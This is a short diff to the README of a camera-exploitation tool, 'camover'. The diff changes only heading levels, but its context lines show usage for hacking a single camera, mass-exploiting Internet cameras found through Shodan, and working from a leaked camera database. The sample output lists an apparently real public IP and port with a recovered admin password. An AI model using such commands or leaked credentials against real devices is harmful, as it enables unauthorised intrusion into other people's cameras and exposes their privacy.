@@ -55,7 +55,7 @@ optional arguments:
 
 ## Examples
 
-#### Exploiting single camera
+### Exploiting single camera
 
 Let's hack my camera just for fun.
 
@@ -63,7 +63,7 @@ Let's hack my camera just for fun.
 camover -a 192.168.99.100
 ```
 
-#### Exploiting cameras from Internet
+### Exploiting cameras from Internet
 
 Let's try to use Shodan search engine to exploit cameras over Internet, we will use it with `-t` for fast exploitation.
 
@@ -89,7 +89,7 @@ $ camover -t --shodan [REDACTED]
 [+] (200.126.178.171:81) - admin:888888
 ```
 
-#### Exploiting cameras from input file
+### Exploiting cameras from input file
 
 Let's try to use opened database of cameras with -t for fast exploitation.
 
